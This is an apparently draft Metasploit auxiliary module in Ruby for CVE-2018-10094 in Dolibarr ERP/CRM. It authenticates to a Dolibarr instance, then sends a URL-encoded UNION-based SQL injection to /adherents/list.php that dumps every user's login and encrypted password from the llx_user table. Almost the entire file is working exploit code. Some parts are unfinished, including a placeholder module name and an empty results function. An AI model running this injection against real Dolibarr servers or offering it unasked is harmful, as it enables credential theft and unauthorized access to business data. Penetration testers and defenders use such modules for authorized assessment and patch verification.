##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Module name',
      'Description'    => %q{
         This module enables an authenticated user to view the usernames and encrypted passwords of other users in the Dolibarr ERP/CRM via SQL injection.
      },
      'Author'         => [
                            'Issam Rabhi',  # PoC
                            'Kevin Locati', # PoC
                            'Shelby Pace',  # Metasploit Module
                          ],
      'License'        => MSF_LICENSE,
      'References'     => [
                            [ 'CVE', '2018-10094' ],
                            [ 'EDB', '44805']
                          ],
      'DisclosureDate' => "May 30 2018"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to Dolibarr', '/' ]),
        OptString.new('USERNAME', [ true, 'The username for authenticating to Dolibarr', 'admin' ]),
        OptString.new('PASSWORD', [ true, 'The password for authenticating to Dolibarr', 'admin' ])
      ])
  end

  def check_availability
    login_page = target_uri.path << '/index.php' unless target_uri.path.include?('index.php')
    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  normalize_uri(login_page)
    )

    return false unless res && res.body.include?('Dolibarr')

    return res
  end

  def login(response)
    return false unless response

    login_uri = target_uri.path << '/index.php' unless target_uri.path.include?('index.php')
    cookies = response.get_cookies
    print_good(cookies)

    login_res = send_request_cgi(
       'method'  =>  'POST',
       'uri'     =>  normalize_uri(login_uri),
       'cookie'  =>  cookies,
       'vars_post' =>  {
         'username'  =>  datastore['USERNAME'],
         'password'  =>  datastore['PASSWORD'],
         'loginfunction' =>  'loginfunction'
       }
     )

    unless login_res && login_res.body.include?('id="mainmenua_members"')
      fail_with(Failure::NoAccess, "Couldn't log into Dolibarr")
    end

    print_good("Logged in!")
    return cookies
  end

  def get_info(cookies)
    inject_uri = target_uri.path << "/adherents/list.php?leftmenu=members&statut=%31%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%30%2c%31%2c%6c%6f%67%69%6e%2c%70%61%73%73%5f%63%72%79%70%74%65%64%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2c%32%33%2c%32%34%2c%32%35%2c%32%36%2c%32%37%2c%32%38%20%66%72%6f%6d%20%6c%6c%78%5f%75%73%65%72%20%23"
    print_good(normalize_uri(inject_uri))
    inject_res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     => normalize_uri(inject_uri),
      'cookie'  => cookies
    )

    print_good(inject_res.body)
  end

  def format_results

  end

  def run
    available_res = check_availability
    fail_with(Failure::NotFound, "Could not access the Dolibarr webpage") unless available_res

    cookies = login(available_res)
    fail_with(Failure::NoAccess, "Could not log in. Verify credentials") unless cookies

    get_info(cookies)
  end
end
